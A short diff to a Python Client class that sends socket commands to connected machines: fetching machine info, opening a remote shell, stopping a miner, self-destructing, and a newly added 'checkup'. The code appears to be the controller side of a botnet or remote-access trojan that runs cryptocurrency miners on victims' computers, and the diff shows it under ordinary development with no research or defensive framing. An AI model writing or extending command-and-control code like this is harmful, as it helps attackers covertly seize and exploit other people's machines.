@@ -7,7 +7,7 @@ class Client:
         self.client_addr = addr
         self.server = server
         
-        
+    #all of these function names are pretty self explanatory
     def request_info(self):
         command = 'cliget'
         self.conn.send(command.encode('utf-8'))
@@ -17,7 +17,6 @@ class Client:
     def start_shell(self):
             command = 'shell'
             self.conn.send(command.encode('utf-8'))
-            
             return True
 
 
@@ -55,6 +54,10 @@ class Client:
         command = 'stopmine'
         self.conn.send(command.encode('utf-8'))
         self.conn.recv(1024)
+        
+    def checkup(self):
+        command = 'aojshfbgiashf'
+        self.conn.send(command.encode('utf-8'))
         
     def destroy(self):
         command = 'selfdestruct'
